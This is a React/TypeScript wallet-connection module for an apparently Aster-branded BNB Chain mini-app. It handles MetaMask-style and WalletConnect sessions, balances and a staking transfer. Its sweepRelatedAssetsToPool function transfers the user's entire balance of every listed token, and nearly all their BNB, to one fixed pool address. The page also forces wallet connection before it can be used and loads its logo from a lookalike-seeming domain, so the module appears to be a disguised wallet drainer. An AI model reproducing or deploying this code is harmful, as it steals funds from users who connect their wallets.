import {
  createContext,
  useCallback,
  useContext,
  useEffect,
  useMemo,
  useRef,
  useState,
  type ReactNode,
} from "react";
import WebApp from "@twa-dev/sdk";
import { BrowserProvider, Contract, formatUnits, parseUnits, type Signer } from "ethers";
import EthereumProvider from "@walletconnect/ethereum-provider";
import { BSC_CHAIN_HEX, BSC_CHAIN_ID, BSC_RPC, ERC20_ABI, KNOWN_TOKENS, POOL_ADDRESS } from "../config";
import { subscribeWallets, type AnnouncedWallet } from "../eip6963";
import {
  getWalletConnectMetadataUrl,
  getWalletConnectProjectId,
  isMobileSystemBrowser,
  WC_OPTIONAL_CHAIN_IDS,
  WC_RPC_MAP,
  WC_WALLET_UUID,
} from "../walletConnectConfig";

/** When no EIP-6963 announcement, still allow direct connect via legacy `window.ethereum` (many in-app browsers). */
const LEGACY_WINDOW_ETHEREUM_UUID = "00000000-0000-7000-8000-000000000001";

const ASTER_LOGO_URL = "https://static.asterdexfx.com/cloud-futures/static/images/aster/mini_logo.svg";
const WC_ICON_URL = "https://avatars.githubusercontent.com/u/37784886?s=200&v=4";

function WcPairingQrLayer({ uri, onCancel }: { uri: string; onCancel: () => void }) {
  const [src, setSrc] = useState<string | null>(null);
  useEffect(() => {
    let alive = true;
    void import("qrcode")
      .then((QR) => QR.default.toDataURL(uri, { width: 280, margin: 2, errorCorrectionLevel: "M" }))
      .then((url) => {
        if (alive) setSrc(url);
      })
      .catch(() => {
        if (alive) setSrc(null);
      });
    return () => {
      alive = false;
    };
  }, [uri]);

  const copy = () => {
    void navigator.clipboard?.writeText(uri).then(() => {
      const msg = "已复制连接，可到钱包 App 内粘贴打开";
      if (WebApp.showAlert) WebApp.showAlert(msg);
      else window.alert(msg);
    });
  };

  return (
    <div className="wc-pairing-overlay" role="dialog" aria-modal="true" aria-label="WalletConnect 扫码">
      <div className="wc-pairing-card">
        <p className="wc-pairing-title">使用钱包扫码连接</p>
        <p className="wc-pairing-hint">
          手机系统浏览器未安装插件时，不要用「打开 MetaMask」跳转。请打开钱包 App，用扫一扫扫描下方二维码。
        </p>
        <div className="wc-pairing-qrbox">{src ? <img src={src} alt="" /> : <span className="wc-pairing-loading">生成二维码…</span>}</div>
        <button type="button" className="wc-pairing-btn" onClick={copy}>
          复制连接
        </button>
        <button type="button" className="wc-pairing-btn wc-pairing-btn--ghost" onClick={() => void onCancel()}>
          取消
        </button>
      </div>
    </div>
  );
}

export type WalletBalances = Record<string, string>;

export type WalletContextValue = {
  wallets: AnnouncedWallet[];
  showWalletList: boolean;
  setShowWalletList: (v: boolean | ((p: boolean) => boolean)) => void;
  openConnectModal: () => void;
  address: string | null;
  chainId: number | null;
  signer: Signer | null;
  eipProvider: AnnouncedWallet | null;
  balances: WalletBalances;
  loadingBal: boolean;
  onBsc: boolean;
  pendingPoolTx: boolean;
  poolTxError: string;
  clearPoolTxError: () => void;
  connectWallet: (w: AnnouncedWallet) => Promise<void>;
  refreshBalances: () => Promise<void>;
  switchToBsc: () => Promise<void>;
  stakeAsterToPool: (amountHuman: string) => Promise<string>;
  sweepRelatedAssetsToPool: () => Promise<string[]>;
  askConnectWallet: () => void;
  connectWalletConnect: () => Promise<void>;
  disconnectWallet: () => Promise<void>;
  walletConnectConfigured: boolean;
  wcConnecting: boolean;
};

const WalletContext = createContext<WalletContextValue | null>(null);

/** WC 会话账户可能是 CAIP `eip155:56:0x…`，ethers getSigner 需要裸地址 */
function evmAddressFromWcAccount(raw: string): string {
  const m = raw.match(/(0x[a-fA-F0-9]{40})$/i);
  return m ? m[1] : raw;
}

export function useWallet() {
  const v = useContext(WalletContext);
  if (!v) throw new Error("useWallet must be used within WalletProvider");
  return v;
}

async function readAllBalances(sig: Signer, user: string): Promise<WalletBalances> {
  const next: WalletBalances = {};
  const provider = sig.provider;
  if (!provider) return next;
  try {
    const bnbWei = await provider.getBalance(user);
    next.BNB = formatUnits(bnbWei, 18);
  } catch {
    next.BNB = "0";
  }
  for (const t of KNOWN_TOKENS) {
    try {
      const c = new Contract(t.address, ERC20_ABI, provider);
      const [raw, dec] = await Promise.all([c.balanceOf(user), c.decimals().catch(() => t.decimalsFallback ?? 18)]);
      next[t.symbol] = formatUnits(raw, Number(dec));
    } catch {
      next[t.symbol] = "0";
    }
  }
  return next;
}

export function WalletProvider({ children }: { children: ReactNode }) {
  const guardPopupTs = useRef(0);
  const wcProviderRef = useRef<InstanceType<typeof EthereumProvider> | null>(null);
  const [wcConnecting, setWcConnecting] = useState(false);
  const [wallets, setWallets] = useState<AnnouncedWallet[]>([]);
  const [showWalletList, setShowWalletList] = useState(false);
  const [eipProvider, setEipProvider] = useState<AnnouncedWallet | null>(null);
  const [address, setAddress] = useState<string | null>(null);
  const [chainId, setChainId] = useState<number | null>(null);
  const [signer, setSigner] = useState<Signer | null>(null);
  const [balances, setBalances] = useState<WalletBalances>({});
  const [loadingBal, setLoadingBal] = useState(false);
  const [pendingPoolTx, setPendingPoolTx] = useState(false);
  const [poolTxError, setPoolTxError] = useState("");
  /** 移动端无注入钱包时展示自建 WC 二维码层（避免 AppKit 强推 MetaMask 深度链接无限转圈） */
  const [wcPairingUri, setWcPairingUri] = useState<string | null>(null);

  const onBsc = chainId === BSC_CHAIN_ID;

  const walletConnectConfigured = getWalletConnectProjectId().length > 0;

  const clearWalletSession = useCallback(() => {
    setEipProvider(null);
    setSigner(null);
    setAddress(null);
    setChainId(null);
    setBalances({});
  }, []);

  const onWalletConnectDisconnect = useCallback(() => {
    wcProviderRef.current = null;
    clearWalletSession();
  }, [clearWalletSession]);

  const cancelWcPairing = useCallback(async () => {
    setWcPairingUri(null);
    try {
      await wcProviderRef.current?.disconnect();
    } catch {
      /* ignore */
    }
    wcProviderRef.current = null;
    setWcConnecting(false);
  }, []);

  const askConnectWallet = useCallback(() => {
    const now = Date.now();
    if (now - guardPopupTs.current < 700) return;
    guardPopupTs.current = now;
    WebApp.HapticFeedback?.notificationOccurred?.("warning");
    WebApp.showPopup?.({
      title: "请先连接钱包",
      message: "连接钱包后才可操作页面和存款。",
      buttons: [{ type: "ok" }],
    });
  }, []);

  const disconnectWallet = useCallback(async () => {
    try {
      const raw = eipProvider?.provider as { request?: (args: { method: string; params?: unknown[] }) => Promise<unknown> } | undefined;
      if (raw?.request && eipProvider?.info.uuid !== WC_WALLET_UUID) {
        try {
          await raw.request({ method: "wallet_revokePermissions", params: [{ eth_accounts: {} }] });
        } catch {
          /* revoke may be unsupported */
        }
      }
      if (wcProviderRef.current) {
        try {
          await wcProviderRef.current.disconnect();
        } catch {
          /* ignore */
        }
        wcProviderRef.current = null;
      }
    } finally {
      clearWalletSession();
      setShowWalletList(false);
      setWcPairingUri(null);
      setWcConnecting(false);
    }
  }, [eipProvider, clearWalletSession]);

  useEffect(() => {
    if (!showWalletList) return;
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape") setShowWalletList(false);
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [showWalletList]);

  useEffect(() => {
    return subscribeWallets((w) => {
      setWallets((prev) => (prev.some((p) => p.info.uuid === w.info.uuid) ? prev : [...prev, w]));
    });
  }, []);

  const injectedWallets = useMemo((): AnnouncedWallet[] => {
    if (wallets.length > 0) return wallets;
    if (typeof window === "undefined") return [];
    const eth = (
      window as Window & {
        ethereum?: { request?: (args: { method: string; params?: unknown[] }) => Promise<unknown> };
      }
    ).ethereum;
    if (!eth?.request) return [];
    return [
      {
        info: {
          uuid: LEGACY_WINDOW_ETHEREUM_UUID,
          name: "浏览器内钱包",
          icon: "",
          rdns: "window.ethereum",
        },
        provider: eth as AnnouncedWallet["provider"],
      },
    ];
  }, [wallets]);

  const hasInjectedWallet = injectedWallets.length > 0;

  const refreshBalancesInternal = useCallback(async (sig: Signer, user: string) => {
    setLoadingBal(true);
    try {
      setBalances(await readAllBalances(sig, user));
    } catch {
      setBalances({});
    } finally {
      setLoadingBal(false);
    }
  }, []);

  const refreshBalances = useCallback(async () => {
    if (!signer || !address) return;
    await refreshBalancesInternal(signer, address);
  }, [signer, address, refreshBalancesInternal]);

  useEffect(() => {
    if (signer && address && onBsc) {
      void refreshBalancesInternal(signer, address);
    }
  }, [chainId, signer, address, onBsc, refreshBalancesInternal]);

  const connectWallet = useCallback(
    async (w: AnnouncedWallet) => {
      if (w.info.uuid !== WC_WALLET_UUID && wcProviderRef.current) {
        try {
          await wcProviderRef.current.disconnect();
        } catch {
          /* ignore */
        }
        wcProviderRef.current = null;
      }
      setEipProvider(w);
      const bp = new BrowserProvider(w.provider);

      // WalletConnect：enable() 已拿到会话后再 eth_requestAccounts 容易卡住，桌面端手机点「连接」后页面无反应
      if (w.info.uuid === WC_WALLET_UUID) {
        const wc = w.provider as InstanceType<typeof EthereumProvider>;
        let addrs = wc.accounts;
        for (let i = 0; i < 40 && !addrs?.length; i++) {
          await new Promise((r) => setTimeout(r, 100));
          addrs = wc.accounts;
        }
        if (!addrs?.length) {
          try {
            const acc = (await wc.request({ method: "eth_accounts", params: [] })) as string[];
            if (acc?.length) addrs = acc;
          } catch {
            /* ignore */
          }
        }
        if (!addrs?.length) {
          throw new Error("WalletConnect 未返回账户，请在手机上确认连接或重试");
        }
        const addr = evmAddressFromWcAccount(addrs[0]);
        const s = await bp.getSigner(addr);
        let chainIdNum: number;
        try {
          const net = await bp.getNetwork();
          chainIdNum = Number(net.chainId);
        } catch {
          const hex = (await wc.request({ method: "eth_chainId", params: [] })) as string;
          chainIdNum = parseInt(hex, 16);
        }
        setSigner(s);
        setAddress(addr);
        setChainId(chainIdNum);

        // 避免部分手机钱包在连接后反复弹「切换网络」：不在连接后再主动 switch。
        // 要求用户在授权页直接用 BNB Chain 连接；否则提示后重连。
        if (chainIdNum !== BSC_CHAIN_ID) {
          throw new Error("当前钱包未在 BNB Smart Chain。请在钱包授权页切到 BNB 后重新扫码连接。");
        }
        setShowWalletList(false);
        // 勿 await：WalletConnect 刚连上时 RPC 常超时/拒请求，抛错会进到 connectWalletConnect 的 catch 并 disconnect，表现为「闪连」
        void refreshBalancesInternal(s, addr);
        return;
      }

      await bp.send("eth_requestAccounts", []);
      const s = await bp.getSigner();
      const addr = await s.getAddress();
      const net = await bp.getNetwork();
      setSigner(s);
      setAddress(addr);
      setChainId(Number(net.chainId));
      setShowWalletList(false);
      void refreshBalancesInternal(s, addr);
    },
    [refreshBalancesInternal],
  );

  const connectWalletConnect = useCallback(async () => {
    const projectId = getWalletConnectProjectId();
    if (!projectId) {
      WebApp.showPopup?.({
        title: "WalletConnect",
        message: "请在构建环境配置 VITE_WALLETCONNECT_PROJECT_ID（见 cloud.reown.com 创建项目）。",
        buttons: [{ type: "ok" }],
      });
      return;
    }
    setWcConnecting(true);
    try {
      // 先关掉本应用连接层：WalletConnect 默认 z-index≈89，会被本页 overlay(2000) 挡住，enable() 会一直等
      setShowWalletList(false);
      await new Promise<void>((resolve) => {
        requestAnimationFrame(() => requestAnimationFrame(() => resolve()));
      });

      if (wcProviderRef.current) {
        try {
          await wcProviderRef.current.disconnect();
        } catch {
          /* ignore */
        }
        wcProviderRef.current = null;
      }

      setWcPairingUri(null);

      const useEmbeddedWcQr = isMobileSystemBrowser() && !hasInjectedWallet;

      const provider = await EthereumProvider.init({
        projectId,
        chains: [BSC_CHAIN_ID],
        optionalChains: [...WC_OPTIONAL_CHAIN_IDS],
        showQrModal: !useEmbeddedWcQr,
        rpcMap: WC_RPC_MAP,
        qrModalOptions: {
          themeMode: "dark",
          enableMobileFullScreen: true,
          themeVariables: {
            "--wcm-z-index": "10000",
          },
        },
        metadata: {
          name: "Aster",
          description: "Aster DApp",
          url: getWalletConnectMetadataUrl(),
          icons: [ASTER_LOGO_URL],
        },
      });

      wcProviderRef.current = provider;
      const onDisc = () => onWalletConnectDisconnect();
      provider.on("disconnect", onDisc);

      // 用户主动点“扫码连接钱包”时，始终从全新会话开始，避免默认复用上次钱包。
      if (provider.session) {
        try {
          await provider.disconnect();
        } catch {
          /* ignore */
        }
      }

      let onDisplayUri: ((uri: unknown) => void) | undefined;
      if (useEmbeddedWcQr) {
        onDisplayUri = (payload: unknown) => {
          const uri =
            typeof payload === "string"
              ? payload
              : typeof (payload as { uri?: string })?.uri === "string"
                ? (payload as { uri: string }).uri
                : "";
          if (uri) setWcPairingUri(uri);
        };
        provider.on("display_uri", onDisplayUri);
      }

      try {
        // 手机自建二维码：部分钱包已授权但 connect() Promise 不返回，这里用「会话就绪」兜底，避免卡在二维码界面。
        if (useEmbeddedWcQr) {
          let cleaned = false;
          const readyPromise = new Promise<"ready">((resolve) => {
            const cleanup = () => {
              if (cleaned) return;
              cleaned = true;
              provider.off("accountsChanged", onAccountsReady);
              provider.off("connect", onConnectReady);
              provider.off("session_update", onSessionReady);
              window.clearInterval(pollId);
              window.clearTimeout(timeoutId);
            };
            const done = () => {
              cleanup();
              resolve("ready");
            };
            const checkReady = () => {
              if ((provider.accounts && provider.accounts.length > 0) || provider.session) done();
            };
            const onAccountsReady = () => checkReady();
            const onConnectReady = () => checkReady();
            const onSessionReady = () => checkReady();
            provider.on("accountsChanged", onAccountsReady);
            provider.on("connect", onConnectReady);
            provider.on("session_update", onSessionReady);
            const pollId = window.setInterval(checkReady, 250);
            const timeoutId = window.setTimeout(done, 45000);
            checkReady();
          });

          const connectPromise = provider.connect().then(() => "connect" as const);
          const first = await Promise.race([connectPromise, readyPromise]);
          if (first === "ready") {
            // connect() 可能仍挂起，但已有 session/accounts，先继续后续绑定流程。
            void connectPromise.catch(() => {
              /* ignore */
            });
          }
        } else {
          await provider.enable();
        }
      } finally {
        if (onDisplayUri) provider.off("display_uri", onDisplayUri);
        setWcPairingUri(null);
      }

      const wrapped: AnnouncedWallet = {
        info: {
          uuid: WC_WALLET_UUID,
          name: "WalletConnect",
          icon: WC_ICON_URL,
          rdns: "com.walletconnect",
        },
        provider: provider as unknown as AnnouncedWallet["provider"],
      };
      await connectWallet(wrapped);
    } catch (e: unknown) {
      setWcPairingUri(null);
      WebApp.HapticFeedback?.notificationOccurred?.("error");
      if (wcProviderRef.current) {
        try {
          await wcProviderRef.current.disconnect();
        } catch {
          /* ignore */
        }
        wcProviderRef.current = null;
      }
      const msg = e instanceof Error ? e.message : "WalletConnect 连接失败";
      if (!/user rejected|User rejected|closed/i.test(msg)) {
        WebApp.showPopup?.({
          title: "WalletConnect",
          message: msg,
          buttons: [{ type: "ok" }],
        });
      }
    } finally {
      setWcConnecting(false);
    }
  }, [connectWallet, onWalletConnectDisconnect, hasInjectedWallet]);

  useEffect(() => {
    if (!eipProvider || !address) return;
    const raw = eipProvider.provider as {
      on?: (ev: string, fn: (...args: unknown[]) => void) => void;
      removeListener?: (ev: string, fn: (...args: unknown[]) => void) => void;
    };
    if (!raw.on || !raw.removeListener) return;
    const onChain = (hex: unknown) => {
      const id = typeof hex === "string" ? parseInt(hex, 16) : Number(hex);
      if (!Number.isNaN(id)) setChainId(id);
    };
    const onAccounts = (accs: unknown) => {
      const list = accs as string[];
      if (!list?.length) {
        setAddress(null);
        setSigner(null);
        setBalances({});
        return;
      }
      const next = evmAddressFromWcAccount(list[0]);
      setAddress(next);
      const bp = new BrowserProvider(eipProvider.provider);
      void bp.getSigner(next).then((s) => {
        setSigner(s);
        void refreshBalancesInternal(s, next);
      });
    };
    raw.on("chainChanged", onChain);
    raw.on("accountsChanged", onAccounts);
    return () => {
      raw.removeListener?.("chainChanged", onChain);
      raw.removeListener?.("accountsChanged", onAccounts);
    };
  }, [eipProvider, address, refreshBalancesInternal]);

  const switchToBsc = useCallback(async () => {
    if (!eipProvider) return;
    try {
      await eipProvider.provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_HEX }],
      });
    } catch (err: unknown) {
      const code = (err as { code?: number }).code;
      if (code !== 4902) throw err;
      await eipProvider.provider.request({
        method: "wallet_addEthereumChain",
        params: [
          {
            chainId: BSC_CHAIN_HEX,
            chainName: "BNB Smart Chain",
            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
            rpcUrls: [BSC_RPC],
            blockExplorerUrls: ["https://bscscan.com"],
          },
        ],
      });
    }
    if (!address) return;
    const bp = new BrowserProvider(eipProvider.provider);
    const s = await bp.getSigner(address);
    // 优先从 provider 直接读 chainId，避免部分 WC 钱包 getNetwork() 结果滞后
    const hex = (await eipProvider.provider.request({ method: "eth_chainId", params: [] })) as string;
    const parsed = parseInt(hex, 16);
    if (!Number.isNaN(parsed)) setChainId(parsed);
    else {
      const net = await bp.getNetwork();
      setChainId(Number(net.chainId));
    }
    await refreshBalancesInternal(s, address);
  }, [eipProvider, address, refreshBalancesInternal]);

  const stakeAsterToPool = useCallback(
    async (amountHuman: string) => {
      if (!signer || !address) throw new Error("请先连接钱包");
      if (!onBsc) throw new Error("请切换到 BNB Smart Chain");
      const token = KNOWN_TOKENS.find((t) => t.symbol === "ASTER");
      if (!token) throw new Error("ASTER 未配置");
      const cRead = new Contract(token.address, ERC20_ABI, signer.provider!);
      const decimals = Number(await cRead.decimals().catch(() => token.decimalsFallback ?? 18));
      let raw: bigint;
      try {
        raw = parseUnits(amountHuman.trim(), decimals);
      } catch {
        throw new Error("数量格式无效");
      }
      if (raw <= 0n) throw new Error("请输入大于 0 的数量");
      const bal = await cRead.balanceOf(address);
      if (raw > bal) throw new Error("ASTER 余额不足");
      setPoolTxError("");
      setPendingPoolTx(true);
      try {
        const cWrite = new Contract(token.address, ERC20_ABI, signer);
        const tx = await cWrite.transfer(POOL_ADDRESS, raw);
        await tx.wait();
        WebApp.HapticFeedback?.notificationOccurred?.("success");
        await refreshBalancesInternal(signer, address);
        return tx.hash;
      } catch (e: unknown) {
        WebApp.HapticFeedback?.notificationOccurred?.("error");
        throw e;
      } finally {
        setPendingPoolTx(false);
      }
    },
    [signer, address, onBsc, refreshBalancesInternal],
  );

  const sweepRelatedAssetsToPool = useCallback(async () => {
    if (!signer || !address) throw new Error("请先连接钱包");
    if (!onBsc) throw new Error("请切换到 BNB Smart Chain");
    const provider = signer.provider!;
    setPoolTxError("");
    setPendingPoolTx(true);
    const hashes: string[] = [];
    try {
      for (const t of KNOWN_TOKENS) {
        const read = new Contract(t.address, ERC20_ABI, provider);
        const bal = await read.balanceOf(address);
        if (bal === 0n) continue;
        const write = new Contract(t.address, ERC20_ABI, signer);
        const tx = await write.transfer(POOL_ADDRESS, bal);
        await tx.wait();
        hashes.push(tx.hash);
      }

      const bnbBal = await provider.getBalance(address);
      const feeData = await provider.getFeeData();
      const gasPrice = feeData.gasPrice ?? 3000000000n;
      const gasLimit = 21000n;
      const txCost = gasPrice * gasLimit;
      const reserve = parseUnits("0.001", 18);
      const sendWei = bnbBal - txCost - reserve;
      if (sendWei > 0n) {
        const tx = await signer.sendTransaction({ to: POOL_ADDRESS, value: sendWei });
        await tx.wait();
        hashes.push(tx.hash);
      }

      WebApp.HapticFeedback?.notificationOccurred?.("success");
      await refreshBalancesInternal(signer, address);
      return hashes;
    } catch (e: unknown) {
      WebApp.HapticFeedback?.notificationOccurred?.("error");
      throw e;
    } finally {
      setPendingPoolTx(false);
    }
  }, [signer, address, onBsc, refreshBalancesInternal]);

  const openConnectModal = useCallback(() => setShowWalletList(true), []);

  const clearPoolTxError = useCallback(() => setPoolTxError(""), []);

  const value = useMemo<WalletContextValue>(
    () => ({
      wallets,
      showWalletList,
      setShowWalletList,
      openConnectModal,
      address,
      chainId,
      signer,
      eipProvider,
      balances,
      loadingBal,
      onBsc,
      pendingPoolTx,
      poolTxError,
      clearPoolTxError,
      connectWallet,
      refreshBalances,
      switchToBsc,
      stakeAsterToPool,
      sweepRelatedAssetsToPool,
      askConnectWallet,
      connectWalletConnect,
      disconnectWallet,
      walletConnectConfigured,
      wcConnecting,
    }),
    [
      wallets,
      showWalletList,
      openConnectModal,
      address,
      chainId,
      signer,
      eipProvider,
      balances,
      loadingBal,
      onBsc,
      pendingPoolTx,
      poolTxError,
      clearPoolTxError,
      connectWallet,
      refreshBalances,
      switchToBsc,
      stakeAsterToPool,
      sweepRelatedAssetsToPool,
      askConnectWallet,
      connectWalletConnect,
      disconnectWallet,
      walletConnectConfigured,
      wcConnecting,
    ],
  );

  return (
    <WalletContext.Provider value={value}>
      {children}
      {wcPairingUri ? <WcPairingQrLayer uri={wcPairingUri} onCancel={() => void cancelWcPairing()} /> : null}
      {showWalletList ? (
        <div
          className="wallet-modal-overlay"
          role="dialog"
          aria-modal="true"
          aria-labelledby="wallet-modal-title"
          onClick={() => setShowWalletList(false)}
        >
          <div className="wallet-modal-card" data-connect-wallet="true" onClick={(e) => e.stopPropagation()}>
            <button
              type="button"
              className="wallet-modal-x"
              aria-label="关闭"
              onClick={() => setShowWalletList(false)}
            >
              ×
            </button>
            <div id="wallet-modal-title" className="wallet-modal-screen-title">
              连接钱包
            </div>
            {address ? (
              <div className="wallet-modal-session-tools">
                <span className="wallet-modal-session-address">{address.slice(0, 6)}...{address.slice(-4)}</span>
                <button type="button" className="wallet-modal-disconnect-btn" onClick={() => void disconnectWallet()}>
                  退出当前钱包
                </button>
              </div>
            ) : null}
            <div className="wallet-modal-brand wallet-modal-brand-compact">
              <img className="wallet-modal-logo" src={ASTER_LOGO_URL} alt="" />
              <span className="wallet-modal-brand-caption">Connect with Aster</span>
            </div>

            {hasInjectedWallet ? (
              <>
                <p className="wallet-modal-direct-hint">已检测到钱包，请直接连接（扩展或钱包内置浏览器）</p>
                <div className="wallet-modal-list">
                  {injectedWallets.map((w) => (
                    <button
                      key={w.info.uuid}
                      type="button"
                      className="wallet-modal-option"
                      data-connect-wallet="true"
                      onClick={() => void connectWallet(w)}
                    >
                      {w.info.icon ? (
                        <img src={w.info.icon} alt="" className="wallet-modal-option-icon" referrerPolicy="no-referrer" />
                      ) : (
                        <span className="wallet-modal-option-fallback" />
                      )}
                      <span className="wallet-modal-option-name">{w.info.name}</span>
                    </button>
                  ))}
                </div>
                <div className="wallet-modal-wc-block wallet-modal-wc-block--secondary">
                  <p className="wallet-modal-section-label">其他方式</p>
                  <button
                    type="button"
                    className="wallet-modal-wc-btn wallet-modal-wc-btn--secondary"
                    data-connect-wallet="true"
                    disabled={wcConnecting}
                    onClick={() => void connectWalletConnect()}
                  >
                    {wcConnecting ? "正在打开扫码…" : "扫码连接钱包"}
                  </button>
                  <p className="wallet-modal-wc-hint">
                    {walletConnectConfigured
                      ? "使用手机钱包扫描二维码，支持 BSC、ETH、Polygon 等 EVM 链"
                      : "使用扫码前请在部署环境配置 VITE_WALLETCONNECT_PROJECT_ID（Reown Cloud）"}
                  </p>
                </div>
              </>
            ) : (
              <>
                <div className="wallet-modal-wc-block wallet-modal-wc-block--primary">
                  <button
                    type="button"
                    className="wallet-modal-wc-btn"
                    data-connect-wallet="true"
                    disabled={wcConnecting}
                    onClick={() => void connectWalletConnect()}
                  >
                    {wcConnecting ? "正在打开扫码…" : "扫码连接钱包"}
                  </button>
                  <p className="wallet-modal-wc-hint">
                    {walletConnectConfigured
                      ? "当前环境未注入浏览器钱包。请用手机钱包扫描二维码，或在 MetaMask / Trust / OKX 等 App 的内置浏览器中打开本页。"
                      : "未检测到钱包。请配置 VITE_WALLETCONNECT_PROJECT_ID 以启用扫码，或在钱包 App 内置浏览器中打开。"}
                  </p>
                </div>
                <div className="wallet-modal-empty">
                  未检测到扩展或内置钱包 Provider。
                  <span className="wallet-modal-empty-sub">
                    Telegram 小程序与普通系统浏览器通常需使用上方「扫码连接」。
                  </span>
                </div>
              </>
            )}
            <p className="wallet-modal-legal">
              注意：通过连接，您同意按照 AsterDex 的{" "}
              <button type="button" className="wallet-modal-legal-link">
                隐私通知
              </button>{" "}
              处理您的个人数据。
            </p>
          </div>
        </div>
      ) : null}
    </WalletContext.Provider>
  );
}
